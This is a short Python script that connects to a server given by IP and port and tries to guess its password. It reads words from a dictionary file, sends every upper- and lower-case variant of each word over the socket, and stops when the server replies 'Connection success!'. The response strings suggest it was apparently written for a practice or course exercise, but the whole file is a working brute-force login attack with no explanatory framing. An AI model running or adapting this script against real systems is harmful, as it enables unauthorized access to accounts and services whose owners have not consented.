import os
import sys
import socket
import itertools

cw = os.getcwd()
filepath = 'passwords.txt'

ip = sys.argv[1]
port = int(sys.argv[2])

soc = socket.socket()
soc.connect((ip, port))

status = False

with open(filepath) as fp:
    line = fp.readline().strip()
    while line:
        my_iter = map(lambda x: ''.join(x), itertools.product(*([l.lower(), l.upper()] for l in line)))
        while True:
            try:
                msg = ''.join(next(my_iter))
            except StopIteration:
                break
            soc.send(msg.encode())
            res = soc.recv(1024)
            res_str = res.decode()
            if res_str == "Connection success!":
                print(msg)
                status = True
                break
            elif res_str == "Wrong password!":
                continue
        if status == True:
            break
        line = fp.readline().strip()
soc.close()
